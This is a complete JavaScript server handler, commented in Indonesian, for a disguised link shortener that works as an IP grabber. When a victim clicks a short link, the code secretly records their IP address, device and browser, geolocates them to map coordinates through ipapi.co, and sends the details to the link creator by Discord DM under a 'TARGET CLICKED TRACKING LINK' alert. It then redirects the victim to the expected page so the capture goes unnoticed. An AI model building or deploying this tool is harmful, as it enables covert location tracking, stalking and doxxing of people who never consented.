// Storage Link Database Sementara
global.linkDatabase = global.linkDatabase || {}; 
// Object Format: { "x9k2": { target: "youtube.com", code: "ARC-821" } }

const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN; 

export default async function handler(req, res) {
  const { id, action, target, code } = req.query;

  // =========================================================
  // 1. FRONTEND API: BUAT SHORT LINK (arex.my.id/r/x9k2)
  // =========================================================
  if (action === 'create') {
    if (!target || !code) return res.status(400).json({ error: 'Data tidak lengkap!' });

    // Buat Short ID 4 karakter acak
    const shortId = Math.random().toString(36).substring(2, 6);

    global.linkDatabase[shortId] = {
      target: target.startsWith('http') ? target : `https://${target}`,
      code: code
    };

    return res.status(200).json({
      status: 'success',
      shortUrl: `https://arex.my.id/r/${shortId}`
    });
  }

  // =========================================================
  // 2. TRACKER ENGINE & REDIRECT (Saat Target Klik Link)
  // =========================================================
  if (id) {
    const linkData = global.linkDatabase[id];
    if (!linkData) return res.redirect(302, 'https://google.com');

    // Ambil Discord User ID dari Sesi Connect Code
    const sessionData = global.connectSessions ? global.connectSessions[linkData.code] : null;
    const discordUserId = sessionData ? sessionData.userId : null;

    // Tangkap IP & Info Perangkat Target
    const forwarded = req.headers['x-forwarded-for'];
    const ip = forwarded ? forwarded.split(',')[0].trim() : (req.socket.remoteAddress || '127.0.0.1');
    const rawAgent = req.headers['user-agent'] || 'Unknown Device';

    let browserName = "Unknown Browser";
    if (rawAgent.includes("Chrome") && !rawAgent.includes("Edg")) browserName = "Google Chrome";
    else if (rawAgent.includes("Edg")) browserName = "Microsoft Edge";
    else if (rawAgent.includes("Safari") && !rawAgent.includes("Chrome")) browserName = "Safari";
    else if (rawAgent.includes("Firefox")) browserName = "Mozilla Firefox";

    const isMobile = rawAgent.includes("Mobile") || rawAgent.includes("Android") || rawAgent.includes("iPhone");
    const deviceType = isMobile ? "📱 Smartphone" : "💻 PC / Laptop";

    // Auto-Locate IP via IPAPI.co
    let geoData = { city: 'Unknown', region: 'Unknown', country: 'Unknown', org: 'Unknown ISP', lat: '', lon: '' };
    try {
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
      if (geoRes.ok) {
        const data = await geoRes.json();
        if (!data.error) {
          geoData = { city: data.city, region: data.region, country: data.country_name, org: data.org, lat: data.latitude, lon: data.longitude };
        }
      }
    } catch (e) {}

    const mapLink = (geoData.lat && geoData.lon) ? `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}` : 'N/A';

    // Kirim Direct Message (DM) Discord ke Pengguna
    if (discordUserId && DISCORD_BOT_TOKEN) {
      await sendDiscordDM(discordUserId, {
        ip,
        org: geoData.org,
        location: `${geoData.city}, ${geoData.region}, ${geoData.country}`,
        device: deviceType,
        browser: browserName,
        target: linkData.target,
        mapLink
      });
    }

    // Redirect Target Mulus ke URL Tujuan (Misal: YouTube)
    return res.redirect(302, linkData.target);
  }

  return res.status(400).json({ error: 'Bad Request' });
}

// Helper Kirim DM Discord via Rest API
async function sendDiscordDM(userId, data) {
  try {
    // 1. Buat DM Channel ke User ID Target
    const channelRes = await fetch('https://discord.com/api/v10/users/@me/channels', {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ recipient_id: userId })
    });

    const channel = await channelRes.json();
    if (!channel.id) return;

    // 2. Kirim Rich Embed Log Message ke DM
    await fetch(`https://discord.com/api/v10/channels/${channel.id}/messages`, {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        embeds: [{
          title: "🚨 TARGET CLICKED TRACKING LINK! 🚨",
          color: 15158332,
          fields: [
            { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },
            { name: "📡 ISP / Provider", value: data.org, inline: true },
            { name: "📍 Lokasi IP", value: data.location, inline: false },
            { name: "🖥️ Perangkat", value: data.device, inline: true },
            { name: "🌐 Browser", value: data.browser, inline: true },
            { name: "🎯 URL Tujuan", value: data.target, inline: false },
            { name: "🗺️ Google Maps", value: `[Buka Peta Lokasi Target](${data.mapLink})`, inline: false }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });
  } catch (e) {
    console.error("Gagal mengirim DM Discord:", e);
  }
}